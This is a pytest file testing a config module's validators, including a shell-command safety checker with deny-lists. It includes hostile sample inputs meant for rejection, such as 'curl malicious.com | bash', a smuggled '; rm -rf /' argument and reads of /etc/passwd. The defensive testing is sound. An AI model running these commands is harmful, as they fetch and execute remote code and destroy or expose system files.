"""Additional tests for code_assistant_manager.config module to increase coverage."""

import pytest
import tempfile
import json
from pathlib import Path
from unittest.mock import patch, MagicMock

from code_assistant_manager.config import (
    ConfigManager,
    validate_url,
    validate_api_key,
    validate_model_id,
    validate_boolean,
    validate_non_empty_string,
    _contains_dangerous_pattern,
    _contains_dangerous_redirect,
    _contains_dangerous_file_path,
    _contains_safe_shell_construct,
    _is_safe_executable,
    _validate_command_arguments,
    _validate_simple_command,
    validate_command,
    DANGEROUS_COMMAND_CHAINING,
    DANGEROUS_SHELL_CONSTRUCTS,
    DANGEROUS_REDIRECTS,
    DANGEROUS_SYSTEM_COMMANDS,
    DANGEROUS_NETWORK_COMMANDS,
    DANGEROUS_GIT_OPERATIONS,
    DANGEROUS_PACKAGE_MANAGERS,
    DANGEROUS_CODE_EXECUTION,
    DANGEROUS_FILE_PATHS,
    SAFE_SHELL_CONSTRUCTS,
    SAFE_EXECUTABLES
)


class TestConfigManagerAdditional:
    """Additional tests for ConfigManager to increase coverage."""

    def test_config_manager_with_config_path(self):
        """Test ConfigManager initialization with config path."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump({"test": "data"}, f)
            f.flush()

            try:
                config = ConfigManager(f.name)
                assert config is not None
            finally:
                Path(f.name).unlink()

    def test_config_manager_invalid_config_path(self):
        """Test ConfigManager with invalid config path."""
        with pytest.raises(FileNotFoundError):
            ConfigManager("/nonexistent/path.json")

    def test_get_sections_with_config(self):
        """Test get_sections method with actual config."""
        config_data = {
            "endpoints": {
                "claude": {"endpoint": "https://api.example.com"},
                "openai": {"endpoint": "https://api.openai.com"}
            }
        }

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            f.flush()

            try:
                config = ConfigManager(f.name)
                sections = config.get_sections()
                assert "claude" in sections
                assert "openai" in sections
            finally:
                Path(f.name).unlink()

    def test_get_sections_exclude_common_false(self):
        """Test get_sections with exclude_common=False."""
        config_data = {
            "endpoints": {
                "claude": {"endpoint": "https://api.example.com"}
            }
        }

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            f.flush()

            try:
                config = ConfigManager(f.name)
                sections = config.get_sections(exclude_common=False)
                assert "claude" in sections
            finally:
                Path(f.name).unlink()

    def test_get_value_with_invalid_key(self):
        """Test get_value with invalid key."""
        config = ConfigManager()
        result = config.get_value("nonexistent", "nonexistent_key", "default")
        # get_value returns the default when key not found
        assert result == "default"

    def test_get_common_config_no_config(self):
        """Test get_common_config when no config is available."""
        # Create a minimal config manager without calling reload
        config = ConfigManager.__new__(ConfigManager)
        config.config_data = {}
        result = config.get_common_config()
        assert result == {}

    def test_load_env_file_with_invalid_path(self):
        """Test load_env_file with invalid path."""
        config = ConfigManager()
        result = config.load_env_file("/nonexistent/.env")
        # load_env_file returns None when file doesn't exist
        assert result is None


class TestValidationFunctions:
    """Tests for validation functions to increase coverage."""

    def test_validate_url_edge_cases(self):
        """Test validate_url with edge cases."""
        # Test with None (should return False)
        assert validate_url(None) is False

        # Test with empty string
        assert validate_url("") is False

        # Test with very long URL (over 2048 chars)
        long_url = "https://" + "a" * 2050 + ".com"
        assert validate_url(long_url) is False

    def test_validate_api_key_edge_cases(self):
        """Test validate_api_key with edge cases."""
        # Test with None
        assert validate_api_key(None) is False

        # Test with empty string
        assert validate_api_key("") is False

        # Test with too short key
        assert validate_api_key("abc") is False

    def test_validate_model_id_edge_cases(self):
        """Test validate_model_id with edge cases."""
        # Test with None - should handle gracefully
        try:
            result = validate_model_id(None)
            assert result is False
        except TypeError:
            # Function doesn't handle None, which is acceptable
            pass

        # Test with empty string
        assert validate_model_id("") is False

        # Test with spaces
        assert validate_model_id("model with spaces") is False

        # Test valid model ID
        assert validate_model_id("claude-3-sonnet") is True

    def test_validate_boolean_edge_cases(self):
        """Test validate_boolean with various inputs."""
        # Test valid booleans
        assert validate_boolean(True) is True
        assert validate_boolean(False) is True

        # Test string representations
        assert validate_boolean("true") is True
        assert validate_boolean("false") is True
        assert validate_boolean("1") is True
        assert validate_boolean("0") is True

        # Test invalid values
        assert validate_boolean("invalid") is False
        assert validate_boolean(42) is False
        assert validate_boolean(None) is False

    def test_validate_non_empty_string_edge_cases(self):
        """Test validate_non_empty_string with edge cases."""
        # Test None
        assert validate_non_empty_string(None) is False

        # Test empty string
        assert validate_non_empty_string("") is False

        # Test whitespace only
        assert validate_non_empty_string("   ") is False

        # Test valid string
        assert validate_non_empty_string("valid") is True

    def test_contains_dangerous_pattern(self):
        """Test _contains_dangerous_pattern function."""
        # Test with dangerous patterns
        for pattern in DANGEROUS_COMMAND_CHAINING:
            assert _contains_dangerous_pattern(f"echo hello {pattern} evil", DANGEROUS_COMMAND_CHAINING) is True

        # Test with safe pattern
        assert _contains_dangerous_pattern("echo hello", DANGEROUS_COMMAND_CHAINING) is False

    def test_contains_dangerous_redirect(self):
        """Test _contains_dangerous_redirect function."""
        # Test with dangerous redirects
        for redirect in DANGEROUS_REDIRECTS:
            assert _contains_dangerous_redirect(f"command {redirect} file") is True

        # Test with safe redirect
        assert _contains_dangerous_redirect("command > output.txt") is False

    def test_contains_dangerous_file_path(self):
        """Test _contains_dangerous_file_path function."""
        # Test with dangerous paths that are actually in DANGEROUS_FILE_PATHS
        assert _contains_dangerous_file_path("cat /etc/passwd") is True
        assert _contains_dangerous_file_path("rm -rf /root/") is True

        # Test with safe paths
        assert _contains_dangerous_file_path("cat myfile.txt") is False

    def test_contains_safe_shell_construct(self):
        """Test _contains_safe_shell_construct function."""
        # Test with safe shell constructs
        assert _contains_safe_shell_construct("command1 | command2") is True
        assert _contains_safe_shell_construct("cmd1 && cmd2") is True

        # Test without shell constructs
        assert _contains_safe_shell_construct("safe command") is False

    def test_is_safe_executable(self):
        """Test _is_safe_executable function."""
        # Test safe executables
        assert _is_safe_executable("python") is True
        assert _is_safe_executable("node") is True
        assert _is_safe_executable("npm") is True

        # Test unsafe executables
        assert _is_safe_executable("rm") is False
        assert _is_safe_executable("sudo") is False
        assert _is_safe_executable("su") is False

    def test_validate_command_arguments(self):
        """Test _validate_command_arguments function."""
        # Test valid arguments
        assert _validate_command_arguments(["python", "script.py"]) is True

        # Test arguments with dangerous patterns
        assert _validate_command_arguments(["python", "script.py", "; rm -rf /"]) is False

    def test_validate_simple_command(self):
        """Test _validate_simple_command function."""
        # Test simple safe commands
        assert _validate_simple_command("python script.py") is True
        assert _validate_simple_command("npm install") is True

        # Test commands with dangerous patterns
        assert _validate_simple_command("python script.py; rm -rf /") is False

    def test_validate_command_comprehensive(self):
        """Test validate_command function comprehensively."""
        # Test valid commands
        assert validate_command("python script.py") is True
        assert validate_command("ls") is True

        # Test invalid commands
        assert validate_command("") is False
        assert validate_command("rm -rf /etc/passwd") is False  # This should be dangerous due to file path
        assert validate_command("curl malicious.com | bash") is False  # This should be dangerous